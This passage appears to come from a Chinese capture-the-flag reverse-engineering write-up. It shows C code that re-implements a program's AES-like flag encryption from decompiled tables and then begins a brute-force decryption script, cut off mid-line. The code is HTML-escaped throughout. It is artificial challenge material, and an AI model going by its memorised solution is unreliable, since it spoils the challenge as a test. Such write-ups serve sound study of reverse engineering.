0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;BYTE BYTE1(DWORD _data)&#123; return (_data &gt;&gt; 8) &amp; 0XFF;&#125;BYTE BYTE2(DWORD _data)&#123; return (_data &gt;&gt; 16) &amp; 0XFF;&#125;BYTE HIBYTE(DWORD _data)&#123; return (_data &gt;&gt; 24) &amp; 0XFF;&#125;BYTE BYTE0(DWORD _data)&#123; return _data &amp; 0XFF;&#125;DWORD _enc_flag[4] = &#123;0&#125;;int main()&#123; DWORD *flag = (DWORD *)_flag; int key_index = 0; DWORD v9 = 0, v8 = 0, v7 = 0, i = 0; DWORD v11 = 0, v13 = 0, v15 = 0, v17 = 0; DWORD v12 = 0, v14 = 0, v16 = 0, v18 = 0; v9 = flag[3] ^ key[key_index]; key_index += 1; v8 = flag[2] ^ key[key_index]; key_index += 1; v7 = flag[1] ^ key[key_index]; key_index += 1; i = flag[0] ^ key[key_index]; key_index += 1; for (int j = 0; j &lt; 13; j++) &#123; v11 = dword_405420[BYTE1(v9)] ^ dword_405820[BYTE2(v8)] ^ dword_405C20[HIBYTE(v7)] ^ dword_405020[BYTE0(i)]; v13 = dword_405420[BYTE1(i)] ^ dword_405820[BYTE2(v9)] ^ dword_405C20[HIBYTE(v8)] ^ dword_405020[BYTE0(v7)]; v15 = dword_405420[BYTE1(v7)] ^ dword_405820[BYTE2(i)] ^ dword_405C20[HIBYTE(v9)] ^ dword_405020[BYTE0(v8)]; v17 = dword_405420[BYTE1(v8)] ^ dword_405820[BYTE2(v7)] ^ dword_405C20[HIBYTE(i)] ^ dword_405020[BYTE0(v9)]; //最后一轮时 V11, V13, V15, V17的值应该如下 // v11 = 0xf048c314; // v13 = 0xb4db6016; // v15 = 0x8eee5336; // v17 = 0x948726e2; v9 = v17 ^ key[key_index]; key_index += 1; v8 = v15 ^ key[key_index]; key_index += 1; v7 = v13 ^ key[key_index]; key_index += 1; i = v11 ^ key[key_index]; key_index += 1; &#125; //运行到这里，v9, v8, v7, i的数据应该如下 // v9 = 0x948726e2; // v8 = 0x51f188a1; // v7 = 0x9b05b51d; // i = 0xb9f8810c; v12 = (RijnDael_AES_LONG_inv_406120[BYTE1(v9)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v8)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v7)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(i)]; v14 = (RijnDael_AES_LONG_inv_406120[BYTE1(i)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v9)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v8)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(v7)]; v16 = (RijnDael_AES_LONG_inv_406120[BYTE1(v7)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(i)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v9)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(v8)]; v18 = (RijnDael_AES_LONG_inv_406120[BYTE1(v8)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v7)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(i)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(v9)]; //运行到这里，v12, v14, v16, v18的数据应该如下 // 0xe82b2381 v12 // 0x70ea91de v14 // 0xe7e1d2f1 v16 // 0xdb36973b v18 _enc_flag[3] = v18 ^ key[key_index]; key_index += 1; _enc_flag[2] = v16 ^ key[key_index]; key_index += 1; _enc_flag[1] = v14 ^ key[key_index]; key_index += 1; _enc_flag[0] = v12 ^ key[key_index]; for (int i = 0; i &lt; 4; i++) &#123; printf(&quot;%#X, &quot;, _enc_flag[i]); &#125; return 0;&#125; 写解密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207#include &lt;stdio.h&gt;#include &lt;windows.h&gt;size_t count = 0;DWORD key[60] = &#123; 0xc3bb95b, 0x578c9d63, 0x7faca21c, 0x29522e93, 0xb268681, 0xda705e01, 0xa7732a53, 0x72e0c013, 0x4b4fcf3b, 0xe46963a6, 0x3eeea9d2, 0xefb38fbb, 0xd156d880, 0x7d037452, 0xd593ea40, 0xd5223126, 0xaf26ac9d, 0xda87ca74, 0xd15d2669, 0x6cadaad, 0xac55acd2, 0xa8909e12, 0xb1db66, 0xcc4c1870, 0x75a166e9, 0xbdaec1d, 0xd797fcc4, 0x9cd3659b, 0x4c532c0, 0xa8214574, 0xccfdc316, 0x6019b4a2, 0x7e7b8af4, 0xdc4d10d9, 0x4b44995f, 0x2ca5c858, 0xace477b4, 0x64dc8662, 0xace477b4, 0xbbc35df5, 0xa2369a2d, 0x97098986, 0x67e15107, 0xfd0b6e21, 0xc838f1d6, 0xc838f1d6, 0x17272a41, 0x38f9ff4a, 0x353f13ab, 0xf0e8d881, 0x9aea3f26, 0x5f3df40c, 0x0, 0xdf1fdb97, 0x2fded50b, 0x49b04218, 0xf3000000, 0xc3fa1e0f, 0xf3000000, 0x841f &#125;;DWORD dword_405420[256] = &#123; 0xa7f45150, 0x65417e53, 0xa4171ac3, 0x5e273a96, 0x6bab3bcb, 0x459d1ff1, 0x58faacab, 0x3e34b93, 0xfa302055, 0x6d76adf6, 0x76cc8891, 0x4c02f525, 0xd7e54ffc, 0xcb2ac5d7, 0x44352680, 0xa362b58f, 0x5ab1de49, 0x1bba2567, 0xeea4598, 0xc0fe5de1, 0x752fc302, 0xf04c8112, 0x97468da3, 0xf9d36bc6, 0x5f8f03e7, 0x9c921595, 0x7a6dbfeb, 0x595295da, 0x83bed42d, 0x217458d3, 0x69e04929, 0xc8c98e44, 0x89c2756a, 0x798ef478, 0x3e58996b, 0x71b927dd, 0x4fe1beb6, 0xad88f017, 0xac20c966, 0x3ace7db4, 0x4adf6318, 0x311ae582, 0x33519760, 0x7f536245, 0x7764b1e0, 0xae6bbb84, 0xa081fe1c, 0x2b08f994, 0x68487058, 0xfd458f19, 0x6cde9487, 0xf87b52b7, 0xd373ab23, 0x24b72e2, 0x8f1fe357, 0xab55662a, 0x28ebb207, 0xc2b52f03, 0x7bc5869a, 0x837d3a5, 0x872830f2, 0xa5bf23b2, 0x6a0302ba, 0x8216ed5c, 0x1ccf8a2b, 0xb479a792, 0xf207f3f0, 0xe2694ea1, 0xf4da65cd, 0xbe0506d5, 0x6234d11f, 0xfea6c48a, 0x532e349d, 0x55f3a2a0, 0xe18a0532, 0xebf6a475, 0xec830b39, 0xef6040aa, 0x9f715e06, 0x106ebd51, 0x8a213ef9, 0x6dd963d, 0x53eddae, 0xbde64d46, 0x8d5491b5, 0x5dc47105, 0xd406046f, 0x155060ff, 0xfb981924, 0xe9bdd697, 0x434089cc, 0x9ed96777, 0x42e8b0bd, 0x8b890788, 0x5b19e738, 0xeec879db, 0xa7ca147, 0xf427ce9, 0x1e84f8c9, 0x0, 0x86800983, 0xed2b3248, 0x70111eac, 0x725a6c4e, 0xff0efdfb, 0x38850f56, 0xd5ae3d1e, 0x392d3627, 0xd90f0a64, 0xa65c6821, 0x545b9bd1, 0x2e36243a, 0x670a0cb1, 0xe757930f, 0x96eeb4d2, 0x919b1b9e, 0xc5c0804f, 0x20dc61a2, 0x4b775a69, 0x1a121c16, 0xba93e20a, 0x2aa0c0e5, 0xe0223c43, 0x171b121d, 0xd090e0b, 0xc78bf2ad, 0xa8b62db9, 0xa91e14c8, 0x19f15785, 0x775af4c, 0xdd99eebb, 0x607fa3fd, 0x2601f79f, 0xf5725cbc, 0x3b6644c5, 0x7efb5b34, 0x29438b76, 0xc623cbdc, 0xfcedb668, 0xf1e4b863, 0xdc31d7ca, 0x85634210, 0x22971340, 0x11c68420, 0x244a857d, 0x3dbbd2f8, 0x32f9ae11, 0xa129c76d, 0x2f9e1d4b, 0x30b2dcf3, 0x52860dec, 0xe3c177d0, 0x16b32b6c, 0xb970a999, 0x489411fa, 0x64e94722, 0x8cfca8c4, 0x3ff0a01a, 0x2c7d56d8, 0x903322ef, 0x4e4987c7, 0xd138d9c1, 0xa2ca8cfe, 0xbd49836, 0x81f5a6cf, 0xde7aa528, 0x8eb7da26, 0xbfad3fa4, 0x9d3a2ce4, 0x9278500d, 0xcc5f6a9b, 0x467e5462, 0x138df6c2, 0xb8d890e8, 0xf7392e5e, 0xafc382f5, 0x805d9fbe, 0x93d0697c, 0x2dd56fa9, 0x1225cfb3, 0x99acc83b, 0x7d1810a7, 0x639ce86e, 0xbb3bdb7b, 0x7826cd09, 0x18596ef4, 0xb79aec01, 0x9a4f83a8, 0x6e95e665, 0xe6ffaa7e, 0xcfbc2108, 0xe815efe6, 0x9be7bad9, 0x366f4ace, 0x99fead4, 0x7cb029d6, 0xb2a431af, 0x233f2a31, 0x94a5c630, 0x66a235c0, 0xbc4e7437, 0xca82fca6, 0xd090e0b0, 0xd8a73315, 0x9804f14a, 0xdaec41f7, 0x50cd7f0e, 0xf691172f, 0xd64d768d, 0xb0ef434d, 0x4daacc54, 0x496e4df, 0xb5d19ee3, 0x886a4c1b, 0x1f2cc1b8, 0x5165467f, 0xea5e9d04, 0x358c015d, 0x7487fa73, 0x410bfb2e, 0x1d67b35a, 0xd2db9252, 0x5610e933, 0x47d66d13, 0x61d79a8c, 0xca1377a, 0x14f8598e, 0x3c13eb89, 0x27a9ceee, 0xc961b735, 0xe51ce1ed, 0xb1477a3c, 0xdfd29c59, 0x73f2553f, 0xce141879, 0x37c773bf, 0xcdf753ea, 0xaafd5f5b, 0x6f3ddf14, 0xdb447886, 0xf3afca81, 0xc468b93e, 0x3424382c, 0x40a3c25f, 0xc31d1672, 0x25e2bc0c, 0x493c288b, 0x950dff41, 0x1a83971, 0xb30c08de, 0xe4b4d89c, 0xc1566490, 0x84cb7b61, 0xb632d570, 0x5c6c4874, 0x57b8d042 &#125;;DWORD dword_405820[256] = &#123; 0xf45150a7, 0x417e5365, 0x171ac3a4, 0x273a965e, 0xab3bcb6b, 0x9d1ff145, 0xfaacab58, 0xe34b9303, 0x302055fa, 0x76adf66d, 0xcc889176, 0x2f5254c, 0xe54ffcd7, 0x2ac5d7cb, 0x35268044, 0x62b58fa3, 0xb1de495a, 0xba25671b, 0xea45980e, 0xfe5de1c0, 0x2fc30275, 0x4c8112f0, 0x468da397, 0xd36bc6f9, 0x8f03e75f, 0x9215959c, 0x6dbfeb7a, 0x5295da59, 0xbed42d83, 0x7458d321, 0xe0492969, 0xc98e44c8, 0xc2756a89, 0x8ef47879, 0x58996b3e, 0xb927dd71, 0xe1beb64f, 0x88f017ad, 0x20c966ac, 0xce7db43a, 0xdf63184a, 0x1ae58231, 0x51976033, 0x5362457f, 0x64b1e077, 0x6bbb84ae, 0x81fe1ca0, 0x8f9942b, 0x48705868, 0x458f19fd, 0xde94876c, 0x7b52b7f8, 0x73ab23d3, 0x4b72e202, 0x1fe3578f, 0x55662aab, 0xebb20728, 0xb52f03c2, 0xc5869a7b, 0x37d3a508, 0x2830f287, 0xbf23b2a5, 0x302ba6a, 0x16ed5c82, 0xcf8a2b1c, 0x79a792b4, 0x7f3f0f2, 0x694ea1e2, 0xda65cdf4, 0x506d5be, 0x34d11f62, 0xa6c48afe, 0x2e349d53, 0xf3a2a055, 0x8a0532e1, 0xf6a475eb, 0x830b39ec, 0x6040aaef, 0x715e069f, 0x6ebd5110, 0x213ef98a, 0xdd963d06, 0x3eddae05, 0xe64d46bd, 0x5491b58d, 0xc471055d, 0x6046fd4, 0x5060ff15, 0x981924fb, 0xbdd697e9, 0x4089cc43, 0xd967779e, 0xe8b0bd42, 0x8907888b, 0x19e7385b, 0xc879dbee, 0x7ca1470a, 0x427ce90f, 0x84f8c91e, 0x0, 0x80098386, 0x2b3248ed, 0x111eac70, 0x5a6c4e72, 0xefdfbff, 0x850f5638, 0xae3d1ed5, 0x2d362739, 0xf0a64d9, 0x5c6821a6, 0x5b9bd154, 0x36243a2e, 0xa0cb167, 0x57930fe7, 0xeeb4d296, 0x9b1b9e91, 0xc0804fc5, 0xdc61a220, 0x775a694b, 0x121c161a, 0x93e20aba, 0xa0c0e52a, 0x223c43e0, 0x1b121d17, 0x90e0b0d, 0x8bf2adc7, 0xb62db9a8, 0x1e14c8a9, 0xf1578519, 0x75af4c07, 0x99eebbdd, 0x7fa3fd60, 0x1f79f26, 0x725cbcf5, 0x6644c53b, 0xfb5b347e, 0x438b7629, 0x23cbdcc6, 0xedb668fc, 0xe4b863f1, 0x31d7cadc, 0x63421085, 0x97134022, 0xc6842011, 0x4a857d24, 0xbbd2f83d, 0xf9ae1132, 0x29c76da1, 0x9e1d4b2f, 0xb2dcf330, 0x860dec52, 0xc177d0e3, 0xb32b6c16, 0x70a999b9, 0x9411fa48, 0xe9472264, 0xfca8c48c, 0xf0a01a3f, 0x7d56d82c, 0x3322ef90, 0x4987c74e, 0x38d9c1d1, 0xca8cfea2, 0xd498360b, 0xf5a6cf81, 0x7aa528de, 0xb7da268e, 0xad3fa4bf, 0x3a2ce49d, 0x78500d92, 0x5f6a9bcc, 0x7e546246, 0x8df6c213, 0xd890e8b8, 0x392e5ef7, 0xc382f5af, 0x5d9fbe80, 0xd0697c93, 0xd56fa92d, 0x25cfb312, 0xacc83b99, 0x1810a77d, 0x9ce86e63, 0x3bdb7bbb, 0x26cd0978, 0x596ef418, 0x9aec01b7, 0x4f83a89a, 0x95e6656e, 0xffaa7ee6, 0xbc2108cf, 0x15efe6e8, 0xe7bad99b, 0x6f4ace36, 0x9fead409, 0xb029d67c, 0xa431afb2, 0x3f2a3123, 0xa5c63094, 0xa235c066, 0x4e7437bc, 0x82fca6ca, 0x90e0b0d0, 0xa73315d8, 0x4f14a98, 0xec41f7da, 0xcd7f0e50, 0x91172ff6, 0x4d768dd6, 0xef434db0, 0xaacc544d, 0x96e4df04, 0xd19ee3b5, 0x6a4c1b88, 0x2cc1b81f, 0x65467f51, 0x5e9d04ea, 0x8c015d35, 0x87fa7374, 0xbfb2e41, 0x67b35a1d, 0xdb9252d2, 0x10e93356, 0xd66d1347, 0xd79a8c61, 0xa1377a0c, 0xf8598e14, 0x13eb893c, 0xa9ceee27, 0x61b735c9, 0x1ce1ede5, 0x477a3cb1, 0xd29c59df, 0xf2553f73, 0x141879ce, 0xc773bf37, 0xf753eacd, 0xfd5f5baa, 0x3ddf146f, 0x447886db, 0xafca81f3, 0x68b93ec4, 0x24382c34, 0xa3c25f40, 0x1d1672c3, 0xe2bc0c25, 0x3c288b49, 0xdff4195, 0xa8397101, 0xc08deb3, 0xb4d89ce4, 0x566490c1, 0xcb7b6184, 0x32d570b6, 0x6c48745c, 0xb8d04257 &#125;;DWORD dword_405C20[256] = &#123; 0x5150a7f4, 0x7e536541, 0x1ac3a417, 0x3a965e27, 0x3bcb6bab, 0x1ff1459d, 0xacab58fa, 0x4b9303e3, 0x2055fa30, 0xadf66d76, 0x889176cc, 0xf5254c02, 0x4ffcd7e5, 0xc5d7cb2a, 0x26804435, 0xb58fa362, 0xde495ab1, 0x25671bba, 0x45980eea, 0x5de1c0fe, 0xc302752f, 0x8112f04c, 0x8da39746, 0x6bc6f9d3, 0x3e75f8f, 0x15959c92, 0xbfeb7a6d, 0x95da5952, 0xd42d83be, 0x58d32174, 0x492969e0, 0x8e44c8c9, 0x756a89c2, 0xf478798e, 0x996b3e58, 0x27dd71b9, 0xbeb64fe1, 0xf017ad88, 0xc966ac20, 0x7db43ace, 0x63184adf, 0xe582311a, 0x97603351, 0x62457f53, 0xb1e07764, 0xbb84ae6b, 0xfe1ca081, 0xf9942b08, 0x70586848, 0x8f19fd45, 0x94876cde, 0x52b7f87b, 0xab23d373, 0x72e2024b, 0xe3578f1f, 0x662aab55, 0xb20728eb, 0x2f03c2b5, 0x869a7bc5, 0xd3a50837, 0x30f28728, 0x23b2a5bf, 0x2ba6a03, 0xed5c8216, 0x8a2b1ccf, 0xa792b479, 0xf3f0f207, 0x4ea1e269, 0x65cdf4da, 0x6d5be05, 0xd11f6234, 0xc48afea6, 0x349d532e, 0xa2a055f3, 0x532e18a, 0xa475ebf6, 0xb39ec83, 0x40aaef60, 0x5e069f71, 0xbd51106e, 0x3ef98a21, 0x963d06dd, 0xddae053e, 0x4d46bde6, 0x91b58d54, 0x71055dc4, 0x46fd406, 0x60ff1550, 0x1924fb98, 0xd697e9bd, 0x89cc4340, 0x67779ed9, 0xb0bd42e8, 0x7888b89, 0xe7385b19, 0x79dbeec8, 0xa1470a7c, 0x7ce90f42, 0xf8c91e84, 0x0, 0x9838680, 0x3248ed2b, 0x1eac7011, 0x6c4e725a, 0xfdfbff0e, 0xf563885, 0x3d1ed5ae, 0x3627392d, 0xa64d90f, 0x6821a65c, 0x9bd1545b, 0x243a2e36, 0xcb1670a, 0x930fe757, 0xb4d296ee, 0x1b9e919b, 0x804fc5c0, 0x61a220dc, 0x5a694b77, 0x1c161a12, 0xe20aba93, 0xc0e52aa0, 0x3c43e022, 0x121d171b, 0xe0b0d09, 0xf2adc78b, 0x2db9a8b6, 0x14c8a91e, 0x578519f1, 0xaf4c0775, 0xeebbdd99, 0xa3fd607f, 0xf79f2601, 0x5cbcf572, 0x44c53b66, 0x5b347efb, 0x8b762943, 0xcbdcc623, 0xb668fced, 0xb863f1e4, 0xd7cadc31, 0x42108563, 0x13402297, 0x842011c6, 0x857d244a, 0xd2f83dbb, 0xae1132f9, 0xc76da129, 0x1d4b2f9e, 0xdcf330b2, 0xdec5286, 0x77d0e3c1, 0x2b6c16b3, 0xa999b970, 0x11fa4894, 0x472264e9, 0xa8c48cfc, 0xa01a3ff0, 0x56d82c7d, 0x22ef9033, 0x87c74e49, 0xd9c1d138, 0x8cfea2ca, 0x98360bd4, 0xa6cf81f5, 0xa528de7a, 0xda268eb7, 0x3fa4bfad, 0x2ce49d3a, 0x500d9278, 0x6a9bcc5f, 0x5462467e, 0xf6c2138d, 0x90e8b8d8, 0x2e5ef739, 0x82f5afc3, 0x9fbe805d, 0x697c93d0, 0x6fa92dd5, 0xcfb31225, 0xc83b99ac, 0x10a77d18, 0xe86e639c, 0xdb7bbb3b, 0xcd097826, 0x6ef41859, 0xec01b79a, 0x83a89a4f, 0xe6656e95, 0xaa7ee6ff, 0x2108cfbc, 0xefe6e815, 0xbad99be7, 0x4ace366f, 0xead4099f, 0x29d67cb0, 0x31afb2a4, 0x2a31233f, 0xc63094a5, 0x35c066a2, 0x7437bc4e, 0xfca6ca82, 0xe0b0d090, 0x3315d8a7, 0xf14a9804, 0x41f7daec, 0x7f0e50cd, 0x172ff691, 0x768dd64d, 0x434db0ef, 0xcc544daa, 0xe4df0496, 0x9ee3b5d1, 0x4c1b886a, 0xc1b81f2c, 0x467f5165, 0x9d04ea5e, 0x15d358c, 0xfa737487, 0xfb2e410b, 0xb35a1d67, 0x9252d2db, 0xe9335610, 0x6d1347d6, 0x9a8c61d7, 0x377a0ca1, 0x598e14f8, 0xeb893c13, 0xceee27a9, 0xb735c961, 0xe1ede51c, 0x7a3cb147, 0x9c59dfd2, 0x553f73f2, 0x1879ce14, 0x73bf37c7, 0x53eacdf7, 0x5f5baafd, 0xdf146f3d, 0x7886db44, 0xca81f3af, 0xb93ec468, 0x382c3424, 0xc25f40a3, 0x1672c31d, 0xbc0c25e2, 0x288b493c, 0xff41950d, 0x397101a8, 0x8deb30c, 0xd89ce4b4, 0x6490c156, 0x7b6184cb, 0xd570b632, 0x48745c6c, 0xd04257b8 &#125;;DWORD dword_405020[256] = &#123; 0x50a7f451, 0x5365417e, 0xc3a4171a, 0x965e273a, 0xcb6bab3b, 0xf1459d1f, 0xab58faac, 0x9303e34b, 0x55fa3020, 0xf66d76ad, 0x9176cc88, 0x254c02f5, 0xfcd7e54f, 0xd7cb2ac5, 0x80443526, 0x8fa362b5, 0x495ab1de, 0x671bba25, 0x980eea45, 0xe1c0fe5d, 0x2752fc3, 0x12f04c81, 0xa397468d, 0xc6f9d36b, 0xe75f8f03, 0x959c9215, 0xeb7a6dbf, 0xda595295, 0x2d83bed4, 0xd3217458, 0x2969e049, 0x44c8c98e, 0x6a89c275, 0x78798ef4, 0x6b3e5899, 0xdd71b927, 0xb64fe1be, 0x17ad88f0, 0x66ac20c9, 0xb43ace7d, 0x184adf63, 0x82311ae5, 0x60335197, 0x457f5362, 0xe07764b1, 0x84ae6bbb, 0x1ca081fe, 0x942b08f9, 0x58684870, 0x19fd458f, 0x876cde94, 0xb7f87b52, 0x23d373ab, 0xe2024b72, 0x578f1fe3, 0x2aab5566, 0x728ebb2, 0x3c2b52f, 0x9a7bc586, 0xa50837d3, 0xf2872830, 0xb2a5bf23, 0xba6a0302, 0x5c8216ed, 0x2b1ccf8a, 0x92b479a7, 0xf0f207f3, 0xa1e2694e, 0xcdf4da65, 0xd5be0506, 0x1f6234d1, 0x8afea6c4, 0x9d532e34, 0xa055f3a2, 0x32e18a05, 0x75ebf6a4, 0x39ec830b, 0xaaef6040, 0x69f715e, 0x51106ebd, 0xf98a213e, 0x3d06dd96, 0xae053edd, 0x46bde64d, 0xb58d5491, 0x55dc471, 0x6fd40604, 0xff155060, 0x24fb9819, 0x97e9bdd6, 0xcc434089, 0x779ed967, 0xbd42e8b0, 0x888b8907, 0x385b19e7, 0xdbeec879, 0x470a7ca1, 0xe90f427c, 0xc91e84f8, 0x0, 0x83868009, 0x48ed2b32, 0xac70111e, 0x4e725a6c, 0xfbff0efd, 0x5638850f, 0x1ed5ae3d, 0x27392d36, 0x64d90f0a, 0x21a65c68, 0xd1545b9b, 0x3a2e3624, 0xb1670a0c, 0xfe75793, 0xd296eeb4, 0x9e919b1b, 0x4fc5c080, 0xa220dc61, 0x694b775a, 0x161a121c, 0xaba93e2, 0xe52aa0c0, 0x43e0223c, 0x1d171b12, 0xb0d090e, 0xadc78bf2, 0xb9a8b62d, 0xc8a91e14, 0x8519f157, 0x4c0775af, 0xbbdd99ee, 0xfd607fa3, 0x9f2601f7, 0xbcf5725c, 0xc53b6644, 0x347efb5b, 0x7629438b, 0xdcc623cb, 0x68fcedb6, 0x63f1e4b8, 0xcadc31d7, 0x10856342, 0x40229713, 0x2011c684, 0x7d244a85, 0xf83dbbd2, 0x1132f9ae, 0x6da129c7, 0x4b2f9e1d, 0xf330b2dc, 0xec52860d, 0xd0e3c177, 0x6c16b32b, 0x99b970a9, 0xfa489411, 0x2264e947, 0xc48cfca8, 0x1a3ff0a0, 0xd82c7d56, 0xef903322, 0xc74e4987, 0xc1d138d9, 0xfea2ca8c, 0x360bd498, 0xcf81f5a6, 0x28de7aa5, 0x268eb7da, 0xa4bfad3f, 0xe49d3a2c, 0xd927850, 0x9bcc5f6a, 0x62467e54, 0xc2138df6, 0xe8b8d890, 0x5ef7392e, 0xf5afc382, 0xbe805d9f, 0x7c93d069, 0xa92dd56f, 0xb31225cf, 0x3b99acc8, 0xa77d1810, 0x6e639ce8, 0x7bbb3bdb, 0x97826cd, 0xf418596e, 0x1b79aec, 0xa89a4f83, 0x656e95e6, 0x7ee6ffaa, 0x8cfbc21, 0xe6e815ef, 0xd99be7ba, 0xce366f4a, 0xd4099fea, 0xd67cb029, 0xafb2a431, 0x31233f2a, 0x3094a5c6, 0xc066a235, 0x37bc4e74, 0xa6ca82fc, 0xb0d090e0, 0x15d8a733, 0x4a9804f1, 0xf7daec41, 0xe50cd7f, 0x2ff69117, 0x8dd64d76, 0x4db0ef43, 0x544daacc, 0xdf0496e4, 0xe3b5d19e, 0x1b886a4c, 0xb81f2cc1, 0x7f516546, 0x4ea5e9d, 0x5d358c01, 0x737487fa, 0x2e410bfb, 0x5a1d67b3, 0x52d2db92, 0x335610e9, 0x1347d66d, 0x8c61d79a, 0x7a0ca137, 0x8e14f859, 0x893c13eb, 0xee27a9ce, 0x35c961b7, 0xede51ce1, 0x3cb1477a, 0x59dfd29c, 0x3f73f255, 0x79ce1418, 0xbf37c773, 0xeacdf753, 0x5baafd5f, 0x146f3ddf, 0x86db4478, 0x81f3afca, 0x3ec468b9, 0x2c342438, 0x5f40a3c2, 0x72c31d16, 0xc25e2bc, 0x8b493c28, 0x41950dff, 0x7101a839, 0xdeb30c08, 0x9ce4b4d8, 0x90c15664, 0x6184cb7b, 0x70b632d5, 0x745c6c48, 0x4257b8d0 &#125;;BYTE RijnDael_AES_LONG_inv_406120[256] = &#123; 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D &#125;;BYTE BYTE1(DWORD _data)&#123; return (_data &gt;&gt; 8) &amp; 0XFF;&#125;BYTE BYTE2(DWORD _data)&#123; return (_data &gt;&gt; 16) &amp; 0XFF;&#125;BYTE BYTE3(DWORD _data)&#123; return (_data &gt;&gt; 24) &amp; 0XFF;&#125;BYTE BYTE0(DWORD _data)&#123; return _data &amp; 0XFF;&#125;// void brute(DWORD target /*, unsigned char *a1, unsigned char *a2, unsigned char *a3, unsigned char *a4*/)// &#123;// for (unsigned char i1 = 0; i1 &lt; 256; i1++)// &#123;// for (unsigned char i2 = 0; i2 &lt; 256; i2++)// &#123;// for (unsigned char i3 = 0; i3 &lt; 256; i3++)// &#123;// for (unsigned char i4 = 0; i4 &lt; 256; i4++)// &#123;// if ((dword_405020[i1] ^ dword_405420[i2] ^ dword_405820[i3] ^ dword_405C20[i4]) == target)// &#123;// printf(&quot;brute found for %#x: %d %d %d %d\\n&quot;, target, i1, i2, i3, i4);// // *a1 = i1;// // *a2 = i2;// // *a3 = i3;// // *a4 = i4;// return;// &#125;// &#125;// &#125;// &#125;// &#125;// &#125;void brute(DWORD target, unsigned char* a1, unsigned char* a2, unsigned char* a3, unsigned char* a4)&#123; for (size_t i1 = 0; i1 &lt; 256; i1++) &#123; for (size_t i2 = 0; i2 &lt; 256; i2++) &#123; for (size_t i3 = 0; i3 &lt; 256; i3++) &#123; for (size_t i4 = 0; i4 &lt; 256; i4++) &#123; if ((dword_405420[i1] ^ dword_405820[i2] ^ dword_405C20[i3] ^ dword_405020[i4]) == target) &#123; printf(&quot;%d - brute found for %x:%d %d %d %d\\n&quot;, count++, 